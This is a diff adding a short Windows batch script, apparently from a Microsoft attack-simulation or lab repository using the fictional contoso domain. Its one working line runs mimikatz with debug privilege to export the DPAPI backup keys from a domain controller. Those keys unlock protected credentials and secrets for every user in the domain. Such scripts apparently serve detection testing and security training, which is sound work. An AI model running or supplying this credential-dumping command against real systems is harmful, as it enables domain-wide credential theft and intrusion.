@@ -1,0 +1,6 @@
+:: Copyright (c) Microsoft Corporation.  
+:: Licensed under the MIT license.
+
+:: DPAPI (data protection key)
+c:\tools\mimikatz\x64\mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:contosodc.contoso.azure /export" "exit"
+pause
